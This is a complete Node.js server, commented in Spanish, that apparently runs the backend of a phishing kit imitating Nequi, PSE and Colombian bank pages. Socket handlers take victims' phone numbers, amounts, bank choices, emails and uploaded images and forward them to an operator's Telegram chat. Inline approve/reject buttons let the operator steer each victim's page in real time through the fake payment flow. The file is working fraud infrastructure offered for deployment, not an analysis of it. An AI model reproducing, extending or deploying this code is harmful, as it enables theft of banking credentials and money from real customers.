const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

const PORT = process.env.PORT || 3000;
const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || process.env.CHAT_ID;
const NODE_ENV = process.env.NODE_ENV || 'development';

// Validar variables de entorno de Telegram
if (!TELEGRAM_TOKEN) {
    console.error('❌ FATAL ERROR: TELEGRAM_BOT_TOKEN environment variable is not set.');
    console.error('   Please set it in your Railway project variables.');
    process.exit(1);
}

if (!CHAT_ID) {
    console.error('❌ FATAL ERROR: TELEGRAM_CHAT_ID environment variable is not set.');
    console.error('   Please set it in your Railway project variables.');
    process.exit(1);
}

const app = express();
const server = http.createServer(app);

// Configuración optimizada de Socket.IO para Railway
const io = socketIO(server, {
    cors: { 
        origin: "*", 
        methods: ["GET", "POST"],
        credentials: true
    },
    pingInterval: 10000,      // Aumentado para Railway
    pingTimeout: 20000,       // Aumentado para Railway
    connectTimeout: 30000,    // Timeout de conexión
    upgradeTimeout: 10000,    // Timeout para upgrade de polling a websocket
    maxHttpBufferSize: 1e8,   // 100MB para imágenes
    transports: ['websocket', 'polling'],
    allowUpgrades: true,
    perMessageDeflate: {
        threshold: 1024
    },
    httpCompression: {
        threshold: 1024
    }
});

const bot = new TelegramBot(TELEGRAM_TOKEN);

// Configurar el webhook en producción
if (NODE_ENV === 'production') {
    const WEBHOOK_URL = `https://${process.env.RAILWAY_PUBLIC_DOMAIN}/api/telegram/webhook`;
    bot.setWebHook(WEBHOOK_URL)
        .then(() => console.log(`✅ Webhook configurado en: ${WEBHOOK_URL}`))
        .catch(err => console.error('❌ Error al configurar el webhook:', err));
} else {
    // En desarrollo, usamos polling para facilitar las pruebas locales
    bot.startPolling()
        .then(() => console.log('🤖 Bot de Telegram iniciado con polling para desarrollo'))
        .catch(err => console.error('❌ Error al iniciar polling:', err));
}

class SessionManager {
    constructor() {
        this.sessions = new Map();
        this.socketToSession = new Map();
        this.EXPIRY_TIME = 30 * 60 * 1000;
    }

    createSession(sessionId, socketId, module, data = {}) {
        const sessionData = {
            sessionId,
            socketId,
            module,
            currentPage: module,
            data,
            createdAt: Date.now(),
            lastActivity: Date.now()
        };
        this.sessions.set(sessionId, sessionData);
        this.socketToSession.set(socketId, sessionId);
        return sessionData;
    }

    getSession(sessionId) {
        return this.sessions.get(sessionId);
    }

    getSessionBySocket(socketId) {
        const sessionId = this.socketToSession.get(socketId);
        return sessionId ? this.sessions.get(sessionId) : null;
    }

    updatePage(sessionId, page) {
        const session = this.sessions.get(sessionId);
        if (session) {
            session.currentPage = page;
            session.lastActivity = Date.now();
            return true;
        }
        return false;
    }

    addData(sessionId, newData) {
        const session = this.sessions.get(sessionId);
        if (session) {
            session.data = { ...session.data, ...newData };
            session.lastActivity = Date.now();
            return true;
        }
        return false;
    }

    updateSocket(sessionId, newSocketId) {
        const session = this.sessions.get(sessionId);
        if (session) {
            if (session.socketId) this.socketToSession.delete(session.socketId);
            session.socketId = newSocketId;
            session.lastActivity = Date.now();
            this.socketToSession.set(newSocketId, sessionId);
            return true;
        }
        return false;
    }

    deleteSession(sessionId) {
        const session = this.sessions.get(sessionId);
        if (session) {
            this.socketToSession.delete(session.socketId);
            this.sessions.delete(sessionId);
            return true;
        }
        return false;
    }

    cleanExpiredSessions() {
        const now = Date.now();
        let cleaned = 0;
        for (const [sessionId, session] of this.sessions.entries()) {
            if (now - session.lastActivity > this.EXPIRY_TIME) {
                this.deleteSession(sessionId);
                cleaned++;
            }
        }
        return cleaned;
    }

    getStats() {
        const modules = {};
        for (const session of this.sessions.values()) {
            modules[session.module] = (modules[session.module] || 0) + 1;
        }
        return {
            totalSessions: this.sessions.size,
            byModule: modules
        };
    }
}

const sessionManager = new SessionManager();

// Mapa para almacenar mensajes de Telegram por sessionId
const telegramMessages = new Map();

app.use(express.static(path.join(__dirname)));
app.use(express.json());

io.on('connection', (socket) => {
    console.log('✅ Cliente conectado:', socket.id);

    socket.on('initSession', (payload) => {
        const { sessionId, module, page, data } = payload;
        let session = sessionManager.getSession(sessionId);
        
        if (session) {
            sessionManager.updateSocket(sessionId, socket.id);
            sessionManager.updatePage(sessionId, page);
            console.log(`🔄 Sesión actualizada: ${sessionId} | Módulo: ${module} | Página: ${page}`);
        } else {
            session = sessionManager.createSession(sessionId, socket.id, module, data);
            console.log(`🆕 Nueva sesión creada: ${sessionId} | Módulo: ${module}`);
        }

        socket.emit('sessionConfirmed', {
            success: true,
            sessionId,
            session: { module: session.module, currentPage: session.currentPage, data: session.data }
        });
    });

    // Manejador alternativo para bancas que usan init_session con guión bajo
    socket.on('init_session', (payload) => {
        const { sessionId } = payload;
        let session = sessionManager.getSession(sessionId);
        
        if (session) {
            sessionManager.updateSocket(sessionId, socket.id);
            console.log(`🔄 Sesión de banca reconectada: ${sessionId} | Socket: ${socket.id}`);
        } else {
            // Crear sesión temporal si no existe (puede venir de PSE)
            session = sessionManager.createSession(sessionId, socket.id, 'banco', {});
            console.log(`🆕 Nueva sesión de banco creada: ${sessionId} | Socket: ${socket.id}`);
        }

        socket.emit('session_ready', {
            sessionId: sessionId,
            socketId: socket.id
        });
    });

    socket.on('updatePage', ({ sessionId, page }) => {
        sessionManager.updatePage(sessionId, page);
    });

    socket.on('keepAlive', ({ sessionId }) => {
        const session = sessionManager.getSession(sessionId);
        if (session) session.lastActivity = Date.now();
    });

    socket.on('ping', () => socket.emit('pong'));

    socket.on('sendPSEToTelegram', async ({ sessionId, data }) => {
        console.log('📤 Recibiendo datos PSE:', { sessionId, data });
        try {
            sessionManager.addData(sessionId, { 
                ...data, 
                pseCompleted: true, 
                pseTimestamp: Date.now() 
            });
            
            const keyboard = {
                inline_keyboard: [
                    [
                        { text: '✅ Aprobar', callback_data: `pse_approve_${sessionId}` },
                        { text: '⏳ Esperar', callback_data: `pse_wait_${sessionId}` }
                    ],
                    [{ text: '❌ Rechazar', callback_data: `pse_reject_${sessionId}` }]
                ]
            };

            console.log('📨 Enviando PSE a Telegram - Chat:', CHAT_ID, '| Keyboard:', JSON.stringify(keyboard));
            const telegramMessage = await bot.sendMessage(
                CHAT_ID, 
                formatPSEMessage(data, sessionId), 
                {
                    parse_mode: 'HTML',
                    reply_markup: keyboard
                }
            );

            console.log('✅ Mensaje PSE enviado a Telegram:', telegramMessage.message_id);
            socket.emit('telegramSent', { success: true, sessionId, messageId: telegramMessage.message_id });
        } catch (error) {
            console.error('❌ Error enviando PSE a Telegram:', error.message, error.response?.body);
            socket.emit('error', { 
                message: 'Error al enviar datos PSE', 
                error: error.message 
            });
        }
    });

    socket.on('sendToTelegram', async ({ sessionId, data }) => {
        console.log('📤 Recibiendo datos Nequi:', { sessionId, data });
        try {
            sessionManager.addData(sessionId, { 
                ...data, 
                nequiFormCompleted: true, 
                nequiTimestamp: Date.now() 
            });

            const keyboard = {
                inline_keyboard: [
                    [
                        { text: '✅ Continuar a PSE', callback_data: `nequi_follow_${sessionId}` },
                        { text: '⏳ Esperar', callback_data: `nequi_wait_${sessionId}` }
                    ],
                    [{ text: '❌ Rechazar', callback_data: `nequi_reject_${sessionId}` }]
                ]
            };

            console.log('📨 Enviando a Telegram - Chat:', CHAT_ID, '| Keyboard:', JSON.stringify(keyboard));
            const telegramMessage = await bot.sendMessage(
                CHAT_ID, 
                formatTelegramMessage(data, sessionId), 
                {
                    parse_mode: 'HTML',
                    reply_markup: keyboard
                }
            );

            console.log('✅ Mensaje Nequi enviado a Telegram:', telegramMessage.message_id);
            socket.emit('telegramSent', { success: true, sessionId, messageId: telegramMessage.message_id });
        } catch (error) {
            console.error('❌ Error enviando a Telegram:', error.message, error.response?.body);
            socket.emit('error', { 
                message: 'Error al enviar datos', 
                error: error.message 
            });
        }
    });

    // PROXY TRANSPARENTE: Interceptar y reenviar mensajes de las bancas al Telegram principal
    socket.on('sendData', async (data) => {
        console.log('🔍 PROXY: Interceptando mensaje de banca:', data);
        
        try {
            // Extraer sessionId (puede venir del data o del payload)
            let sessionId = data.sessionId;
            
            // Si no hay sessionId en el data, buscar en la sesión del socket
            if (!sessionId) {
                const session = sessionManager.getSessionBySocket(socket.id);
                sessionId = session ? session.sessionId : null;
            }
            
            if (!sessionId) {
                console.warn('⚠️ No se encontró sessionId, creando temporal');
                sessionId = `temp_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
            }

            const session = sessionManager.getSession(sessionId);
            const sessionData = session ? session.data : {};

            // Guardar datos en la sesión
            if (session) {
                sessionManager.addData(sessionId, {
                    [`bank_${data.type}`]: data,
                    [`bank_${data.type}_timestamp`]: Date.now()
                });
            }

            // Preparar mensaje para Telegram
            let telegramText = '';
            let keyboard = data.content?.keyboard || null;

            if (data.content?.text) {
                telegramText = data.content.text;
            } else if (typeof data.content === 'string') {
                telegramText = data.content;
            }

            // Agregar contexto de la sesión Nequi/PSE si existe
            let fullMessage = '';
            if (sessionData.phone || sessionData.amount || sessionData.bank) {
                fullMessage += `━━━━━━━━━━━━━━━━━━━━━━\n`;
                fullMessage += `🔔 <b>DATOS DEL BANCO</b>\n`;
                fullMessage += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;
                if (sessionData.phone) fullMessage += `📱 <b>Celular Nequi:</b> ${sessionData.phone}\n`;
                if (sessionData.amount) fullMessage += `💰 <b>Monto:</b> $${formatAmount(sessionData.amount)}\n`;
                if (sessionData.bank) fullMessage += `🏦 <b>Banco:</b> ${sessionData.bank}\n`;
                if (sessionData.email) fullMessage += `📧 <b>Email PSE:</b> ${sessionData.email}\n`;
                fullMessage += `\n`;
            }
            fullMessage += telegramText;
            fullMessage += `\n\n🆔 <code>${sessionId}</code>`;

            // Si hay imagen, enviar imagen con caption
            if (data.content?.image) {
                console.log('📷 Enviando imagen a Telegram');
                const imageBuffer = Buffer.from(data.content.image.split(',')[1], 'base64');
                
                const sentMessage = await bot.sendPhoto(CHAT_ID, imageBuffer, {
                    caption: fullMessage,
                    parse_mode: 'HTML',
                    reply_markup: keyboard
                });

                // Guardar referencia del mensaje
                telegramMessages.set(sessionId, {
                    messageId: sentMessage.message_id,
                    chatId: CHAT_ID,
                    keyboard: keyboard
                });

                console.log('✅ Imagen enviada a Telegram:', sentMessage.message_id);
                
                // Confirmar al cliente de la banca
                socket.emit('dataSent', { 
                    success: true, 
                    sessionId, 
                    messageId: sentMessage.message_id 
                });
            } else {
                // Enviar texto normal
                console.log('📨 Enviando mensaje a Telegram');
                
                const sentMessage = await bot.sendMessage(CHAT_ID, fullMessage, {
                    parse_mode: 'HTML',
                    reply_markup: keyboard
                });

                // Guardar referencia del mensaje
                telegramMessages.set(sessionId, {
                    messageId: sentMessage.message_id,
                    chatId: CHAT_ID,
                    keyboard: keyboard
                });

                console.log('✅ Mensaje enviado a Telegram:', sentMessage.message_id);
                
                // Confirmar al cliente de la banca
                socket.emit('dataSent', { 
                    success: true, 
                    sessionId, 
                    messageId: sentMessage.message_id 
                });
            }

        } catch (error) {
            console.error('❌ Error en PROXY:', error.message);
            socket.emit('dataSent', { 
                success: false, 
                error: error.message 
            });
        }
    });

    socket.on('disconnect', () => {
        const session = sessionManager.getSessionBySocket(socket.id);
        if (session) {
            console.log('❌ Cliente desconectado:', socket.id, '| Sesión:', session.sessionId);
        }
    });
});

bot.on('callback_query', async (callbackQuery) => {
    const { data, message: { message_id: messageId, chat: { id: chatId } }, id: callbackId } = callbackQuery;

    try {
        console.log('🔘 Callback recibido:', data);
        
        // Intentar parsear diferentes formatos de callback_data
        let sessionId = null;
        let action = null;
        let module = null;
        
        // Formato: action:page:sessionId (usado por algunas bancas)
        if (data.includes(':')) {
            const parts = data.split(':');
            action = parts[0];
            sessionId = parts[parts.length - 1];
            
            console.log('📋 Formato con ":" detectado | Acción:', action, '| SessionId:', sessionId);
        }
        // Formato: module_action_sessionId (usado por Nequi/PSE)
        else if (data.includes('_')) {
            const parts = data.split('_');
            module = parts[0];
            action = parts[1];
            sessionId = parts.slice(2).join('_');
            
            console.log('📋 Formato con "_" detectado | Módulo:', module, '| Acción:', action, '| SessionId:', sessionId);
        }

        if (!sessionId) {
            console.error('❌ No se pudo extraer sessionId del callback');
            await bot.answerCallbackQuery(callbackId, { text: '⚠️ Formato de callback inválido', show_alert: true });
            return;
        }

        const session = sessionManager.getSession(sessionId);
        if (!session) {
            console.warn('⚠️ Sesión no encontrada:', sessionId);
            await bot.answerCallbackQuery(callbackId, { text: '⚠️ Sesión expirada', show_alert: true });
            return;
        }

        const targetSocket = io.sockets.sockets.get(session.socketId);
        if (!targetSocket) {
            console.warn('⚠️ Cliente desconectado para sesión:', sessionId);
            await bot.answerCallbackQuery(callbackId, { text: '⚠️ Cliente desconectado', show_alert: true });
            return;
        }

        console.log('✅ Sesión y socket encontrados, procesando callback');
        
        // Remover teclado inline del mensaje inmediatamente
        await bot.editMessageReplyMarkup(
            { inline_keyboard: [] }, 
            { chat_id: chatId, message_id: messageId }
        ).catch(() => {});

        // Manejadores especiales para Nequi y PSE
        if (module === 'nequi' && action === 'follow') {
            await bot.sendMessage(chatId, '✅ Cliente redirigido a PSE', { reply_to_message_id: messageId });
            targetSocket.emit('actionFollow', { sessionId, action: 'follow', nextPage: 'pse' });
            await bot.answerCallbackQuery(callbackId, { text: '✅ Continuar a PSE' });
            return;
        } else if (module === 'nequi' && action === 'reject') {
            await bot.sendMessage(chatId, '❌ Transacción rechazada', { reply_to_message_id: messageId });
            targetSocket.emit('actionReject', { sessionId, action: 'reject' });
            sessionManager.deleteSession(sessionId);
            await bot.answerCallbackQuery(callbackId, { text: '❌ Rechazado' });
            return;
        } else if (module === 'pse' && action === 'approve') {
            await bot.sendMessage(chatId, '✅ PSE aprobado, redirigiendo al banco...', { reply_to_message_id: messageId });
            targetSocket.emit('actionApprovePSE', { sessionId, action: 'approve' });
            await bot.answerCallbackQuery(callbackId, { text: '✅ PSE aprobado' });
            return;
        } else if (module === 'pse' && action === 'reject') {
            await bot.sendMessage(chatId, '❌ PSE rechazado', { reply_to_message_id: messageId });
            targetSocket.emit('actionRejectPSE', { sessionId, action: 'reject' });
            sessionManager.deleteSession(sessionId);
            await bot.answerCallbackQuery(callbackId, { text: '❌ Rechazado' });
            return;
        }

        // Para todas las demás bancas, enviar la acción directamente
        console.log('📤 Enviando acción al cliente:', { action, sessionId });
        
        targetSocket.emit('telegramAction', {
            action: action,
            sessionId: sessionId,
            messageId: messageId,
            fromTelegram: true,
            telegramMessageId: messageId,
            timestamp: Date.now()
        });

        // Confirmar al admin
        await bot.answerCallbackQuery(callbackId, { 
            text: `✅ Acción "${action}" enviada` 
        });

        // Enviar confirmación en el chat (solo una vez)
        await bot.sendMessage(chatId, `✅ Acción "${action}" enviada`, { 
            reply_to_message_id: messageId 
        });

    } catch (error) {
        console.error('❌ Error en callback_query:', error);
        await bot.answerCallbackQuery(callbackId, { text: '❌ Error', show_alert: true });
    }
});

function formatAmount(amount) {
    const clean = amount ? String(amount).replace(/[^0-9]/g, '') : '0';
    return clean ? parseInt(clean).toLocaleString('es-CO') : 'N/A';
}

function getTimestamp() {
    return new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota', hour: '2-digit', minute: '2-digit', second: '2-digit' });
}

function formatTelegramMessage(data, sessionId) {
    const personType = data.personType === 'natural' ? '👤 Natural' : '🏢 Jurídica';
    const timestamp = getTimestamp();
    
    return `━━━━━━━━━━━━━━━━━━━━━━
🔔 <b>NUEVA RECARGA NEQUI</b>
━━━━━━━━━━━━━━━━━━━━━━

📱 <b>Celular:</b> ${data.phone || 'N/A'}
💰 <b>Monto:</b> $${formatAmount(data.amount)}
${personType}
🕐 <b>Hora:</b> ${timestamp}

🆔 <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━━`.trim();
}

function formatPSEMessage(data, sessionId) {
    const personType = data.personType === 'natural' ? '👤 Natural' : '🏢 Jurídica';
    const registered = data.registeredUser ? '✅ Registrado' : '🆕 Nuevo';
    const timestamp = getTimestamp();

    return `━━━━━━━━━━━━━━━━━━━━━━
💳 <b>FORMULARIO PSE</b>
━━━━━━━━━━━━━━━━━━━━━━

📱 <b>Celular:</b> ${data.phone || 'N/A'}
💰 <b>Monto:</b> $${formatAmount(data.amount)}
🏦 <b>Banco:</b> ${data.bank || 'N/A'}
${personType}
📧 <b>Email:</b> ${data.email || 'N/A'}
${registered}
🕐 <b>Hora:</b> ${timestamp}

🆔 <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━━`.trim();
}



// Limpieza automática de sesiones cada 10 minutos
setInterval(() => sessionManager.cleanExpiredSessions(), 10 * 60 * 1000);

// Ruta para que Telegram envíe las actualizaciones
app.post('/api/telegram/webhook', (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

app.get('/api/stats', (req, res) => {
    res.json({ 
        ...sessionManager.getStats(), 
        uptime: Math.floor(process.uptime()),
        timestamp: Date.now()
    });
});

app.get('/api/session/:sessionId', (req, res) => {
    const session = sessionManager.getSession(req.params.sessionId);
    if (session) {
        res.json({ 
            exists: true, 
            module: session.module, 
            currentPage: session.currentPage,
            createdAt: session.createdAt
        });
    } else {
        res.json({ exists: false });
    }
});

app.get('/api/health', (req, res) => {
    const stats = sessionManager.getStats();
    res.json({ 
        status: 'ok', 
        uptime: Math.floor(process.uptime()), 
        timestamp: Date.now(),
        sessions: stats,
        connections: io.engine.clientsCount
    });
});

// Health check para Railway (sin stats para más velocidad)
app.get('/health', (req, res) => {
    res.status(200).send('OK');
});

// Root endpoint
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`\n🚀 Servidor iniciado - Puerto: ${PORT} | Entorno: ${NODE_ENV}`);
    console.log(`📡 Socket.IO configurado con transports: websocket, polling`);
    console.log(`🤖 Bot de Telegram: Configurado`);
    console.log(`💬 Chat ID: ${CHAT_ID}\n`);
});

bot.on('polling_error', (error) => {
    console.error('❌ Telegram polling error:', error.code, error.message);
});

bot.on('error', (error) => {
    console.error('❌ Telegram bot error:', error.message);
});

process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught Exception:', error);
    if (NODE_ENV === 'production') {
        process.exit(1);
    }
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Unhandled Rejection at:', promise, 'reason:', reason);
});

process.on('SIGTERM', gracefulShutdown);
process.on('SIGINT', gracefulShutdown);

function gracefulShutdown() {
    console.log('\n🛑 Cerrando servidor...');
    server.close(() => {
        console.log('✅ Servidor HTTP cerrado');
        bot.stopPolling()
            .then(() => {
                console.log('✅ Bot de Telegram detenido');
                process.exit(0);
            })
            .catch((err) => {
                console.error('❌ Error deteniendo bot:', err);
                process.exit(1);
            });
    });
    setTimeout(() => {
        console.error('⚠️ Forzando cierre...');
        process.exit(1);
    }, 10000);
}
